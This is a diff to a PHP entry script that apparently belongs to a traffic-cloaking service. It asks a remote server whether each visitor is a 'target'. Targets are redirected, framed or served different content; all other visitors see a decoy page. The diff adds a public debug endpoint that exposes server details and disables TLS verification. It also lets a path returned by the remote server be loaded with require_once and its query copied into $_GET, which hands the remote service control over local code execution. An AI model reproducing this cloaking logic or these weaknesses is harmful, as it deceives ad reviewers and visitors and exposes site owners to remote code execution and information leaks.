@@ -1,9 +1,66 @@
 <?php
+// ==========================================
+// DEBUG BLOCK - START
+// Visit your site with /?test_connection=1 to trigger this.
+// ==========================================
+if (isset($_GET['test_connection'])) {
+    ini_set('display_errors', 1);
+    ini_set('display_startup_errors', 1);
+    error_reporting(E_ALL);
+    
+    echo "<h1>Palladium Connection Debugger</h1>";
+    echo "<p><strong>PHP Version:</strong> " . phpversion() . "</p>";
+    echo "<p><strong>Server Software:</strong> " . $_SERVER['SERVER_SOFTWARE'] . "</p>";
+    
+    $url = 'https://rbl.palladium.expert';
+    echo "<p><strong>Testing Connection to:</strong> $url</p>";
+    
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Try setting to true in production if possible
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT'] ?? 'PalladiumTester/1.0');
+    
+    // Verbose output for deep debugging
+    curl_setopt($ch, CURLOPT_VERBOSE, true);
+    $verbose = fopen('php://temp', 'w+');
+    curl_setopt($ch, CURLOPT_STDERR, $verbose);
+    
+    $result = curl_exec($ch);
+    $info = curl_getinfo($ch);
+    $error = curl_error($ch);
+    $errno = curl_errno($ch);
+    
+    curl_close($ch);
+    
+    if ($errno) {
+        echo "<h2 style='color:red'>Connection FAILED</h2>";
+        echo "<p><strong>cURL Error ($errno):</strong> $error</p>";
+    } else {
+        echo "<h2 style='color:green'>Connection SUCCESS</h2>";
+        echo "<p><strong>HTTP Code:</strong> " . $info['http_code'] . "</p>";
+        echo "<p><strong>Response Size:</strong> " . strlen($result) . " bytes</p>";
+        echo "<h3>Response Body (First 500 chars):</h3>";
+        echo "<pre style='background:#f4f4f4;padding:10px;'>" . htmlspecialchars(substr($result, 0, 500)) . "</pre>";
+    }
+    
+    echo "<h3>Verbose Log:</h3>";
+    rewind($verbose);
+    $verboseLog = stream_get_contents($verbose);
+    echo "<pre style='background:#eee;padding:10px;'>" . htmlspecialchars($verboseLog) . "</pre>";
+    
+    exit; // Stop execution here for debug mode
+}
+// ==========================================
+// DEBUG BLOCK - END
+// ==========================================
 
 $isTarget = (new RequestHandlerClient())->run();
 
 if (!$isTarget) {
-    require_once __DIR__ . '/content.html';
+   require_once __DIR__ . '/content.html';
 }
 
 class RequestHandlerClient
@@ -53,13 +110,10 @@ class RequestHandlerClient
             curl_setopt($curl, CURLOPT_TIMEOUT, 4);
             curl_setopt($curl, CURLOPT_TIMEOUT_MS, 4000);
             curl_setopt($curl, CURLOPT_FORBID_REUSE, true);
-            curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0'); // Pass user agent
+            // Added User Agent to ensure better compatibility with Vercel/Cloud environments
+            curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0');
 
             $result = curl_exec($curl);
-            
-            // Basic error logging for debugging (optional)
-            // if (!$result) { error_log("Palladium cURL Error: " . curl_error($curl)); }
-
             if ($result) {
 				$serverOut = json_decode(
 					$result,
@@ -99,22 +153,18 @@ class RequestHandlerClient
             }
 
             if ($result && $mode == 1) {
-				header("Location: {$target}", true, 302);
+				$this->displayIFrame($target);
 				exit;
 			} elseif ($result && $mode == 2) {
-				header("Location: {$target}", true, 302);
+				header("Location: {$target}");
 				exit;
 			} elseif ($result && $mode == 3) {
-				// Redirect mode logic (replacing local include)
-				if (!preg_match('/^https?:/i', $target)) {
-					// Convert local path to absolute URL if needed, or just redirect
-                    // Assuming $target is a relative path like "hhnew/index.html"
-					$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
-					$host = $_SERVER['HTTP_HOST'];
-                    $target = ltrim($target, '/');
-					$target = "$protocol://$host/$target";
+				$target = parse_url($target);
+				if (isset($target['query'])) {
+					parse_str($target['query'], $_GET);
 				}
-				header("Location: {$target}", true, 302);
+				$this->hideFormNotification();
+				require_once $this->sanitizePath($target['path']);
 				exit;
 			} elseif ($result && $mode == 4) {
 				echo $content;
@@ -128,6 +178,7 @@ class RequestHandlerClient
 				if (!$this->isLocal($path)) {
 					header("404 Not Found", true, 404);
 				} else {
+					$this->hideFormNotification();
 					require_once $path;
 				}
 				exit;
@@ -263,7 +314,17 @@ class RequestHandlerClient
      */
     private function getDefaultAnswer()
     {
-        return false;
+        // Modified to return false so we can fallback to content.html instead of error page
+        // If you prefer the error page, uncomment the lines below and remove 'return false'
+        
+		/*
+		header($_SERVER["SERVER_PROTOCOL"] . ' 500 Internal Server Error', true, 500);
+		echo "<h1>500 Internal Server Error</h1>
+		<p>The request was unsuccessful due to an unexpected condition encountered by the server.</p>";
+		exit;
+		*/
+		
+		return false; 
     }
 }
 ?>
